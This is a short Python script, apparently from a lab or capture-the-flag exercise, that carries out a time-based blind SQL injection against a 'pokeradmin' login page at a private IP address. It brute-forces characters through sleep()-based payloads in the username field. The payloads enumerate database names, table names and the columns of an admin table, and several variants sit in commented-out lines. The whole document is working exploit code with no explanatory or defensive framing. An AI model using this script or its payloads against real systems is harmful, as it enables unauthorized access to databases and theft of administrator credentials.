from pwn import *
import sys, requests, signal, time, string

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)


def sqli():
    # variables
    data=""
    IP_victima = "192.168.100.27"
    URL = "http://"+IP_victima+"/pokeradmin/index.php"
    characters = string.ascii_letters + string.digits + "_-,"

    cabeceras = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    l1= log.progress("SQL Injection")
    l1.status("Iniciando ataque")
    time.sleep(2)
    
    l2= log.progress("Datos Encontrados")
    l3= log.progress("Query")

    for position in range(1, 100):
        for i in characters:
            post_data={
                "op": "adminlogin",
                #"username": f"admin' and if(substr(database(),{position},1)='{i}',sleep(0.9),1)-- -",
                #"username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
                #"username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
                "username": f"admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -",
                "password": "SAD" 
            }
            l3.status(f"{post_data['username']}")

            time_start = time.time()
            r = requests.post(URL, headers=cabeceras, data=post_data)
            time_end = time.time()
            
            if time_end - time_start > 0.9:
                data += i
                l2.status(f"Caracter encontrado: {data}")
                break

if __name__ == "__main__":
    sqli()